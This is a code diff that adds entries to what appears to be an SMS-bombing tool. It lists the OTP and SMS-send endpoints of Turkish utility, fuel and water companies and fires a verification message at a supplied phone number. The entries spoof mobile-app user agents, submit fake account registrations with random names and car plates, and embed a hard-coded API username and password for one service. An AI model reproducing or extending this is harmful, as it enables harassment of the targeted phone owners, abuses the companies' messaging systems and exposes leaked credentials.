@@ -91,8 +91,29 @@ const utilityServices = [
         .timeout(6000)
         .build(),
 
-    // Hizliecza
+    // Hizliecza (Production API - otpOperationType 2)
     new ServiceBuilder('Hizliecza')
+        .url('https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate',
+            'User-Agent': (() => {
+                const deviceInfo = randomDeviceInfo();
+                return `hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0`;
+            })(),
+            'Accept-Language': 'en-US,en;q=0.9',
+            Authorization: 'Bearer null'
+        })
+        .json((phone) => ({
+            otpOperationType: 2,
+            phoneNumber: '+90' + phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Hizliecza (Alternative endpoint - otpOperationType 1)
+    new ServiceBuilder('HizlieczaAlt')
         .url('https://prod.hizliecza.net:443/mobil/account/sendOTP')
         .headers({
             Accept: 'application/json',
@@ -189,7 +210,7 @@ const utilityServices = [
         .timeout(6000)
         .build(),
 
-    // Tasdelen
+    // Tasdelen (HTTPS endpoint)
     new ServiceBuilder('Tasdelen')
         .url('https://tasdelen.sufirmam.com:3300/mobile/send-otp')
         .headers({
@@ -201,6 +222,139 @@ const utilityServices = [
             Connection: 'keep-alive'
         })
         .json((phone) => ({ phone: phone }))
+        .timeout(6000)
+        .build(),
+
+    // Tasdelen (HTTP endpoint - Vakıf Taşdelen Su)
+    new ServiceBuilder('TasdelenHTTP')
+        .url('http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate',
+            'User-Agent': 'Tasdelen/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            PhoneNumber: phone,
+            user: {
+                Password: 'Aa123!35@1',
+                UserName: 'MobilOperator'
+            }
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Aygaz
+    new ServiceBuilder('Aygaz')
+        .url('https://ecommerce-memberapi.aygaz.com.tr:443/api/Membership/SendVerificationCode')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Aygaz/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            Gsm: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Pinar
+    new ServiceBuilder('Pinar')
+        .url('https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            devicetype: 'android',
+            'User-Agent': 'PinarSu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            MobilePhone: phone
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Oliz
+    new ServiceBuilder('Oliz')
+        .url('https://api.oliz.com.tr:443/api/otp/send')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Oliz/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .json((phone) => ({
+            mobile_number: phone,
+            type: null
+        }))
+        .timeout(6000)
+        .build(),
+
+    // Total
+    new ServiceBuilder('Total')
+        .url((phone) => `https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo=${phone}`)
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'Total/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
+        .timeout(6000)
+        .build(),
+
+    // Petrolofisi
+    new ServiceBuilder('Petrolofisi')
+        .url('https://mobilapi.petrolofisi.com.tr:443/api/auth/register')
+        .headers({
+            Accept: 'application/json',
+            'Content-Type': 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'X-Channel': 'IOS',
+            'User-Agent': (() => {
+                const deviceInfo = randomDeviceInfo();
+                return `PetrolOfisi/1 (com.petrolofisi.mobile; build:1; iOS ${deviceInfo.version}) Alamofire/5.6.4`;
+            })(),
+            'Accept-Language': 'tr-TR;q=1.0, en-TR;q=0.9'
+        })
+        .json((phone) => {
+            const firstName = randomFirstName();
+            const lastName = randomLastName();
+            const plate = randomCarPlate();
+            return {
+                approvedContractVersion: 'v1',
+                approvedKvkkVersion: 'v1',
+                contractPermission: true,
+                deviceId: randomDeviceId(),
+                etkContactPermission: true,
+                kvkkPermission: true,
+                mobilePhone: '0' + phone,
+                name: firstName,
+                plate: plate,
+                positiveCard: '',
+                referenceCode: '',
+                surname: lastName
+            };
+        })
+        .successCodes([200, 201, 202, 204, 205])
+        .timeout(6000)
+        .build(),
+
+    // GoYakıt
+    new ServiceBuilder('GoYakıt')
+        .url((phone) => `https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone=${phone}&isRegistered=false`)
+        .method('GET')
+        .headers({
+            Accept: 'application/json',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'User-Agent': 'GoYakıt/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
+            'Accept-Language': 'tr-TR,tr;q=0.9'
+        })
         .timeout(6000)
         .build()
 ];
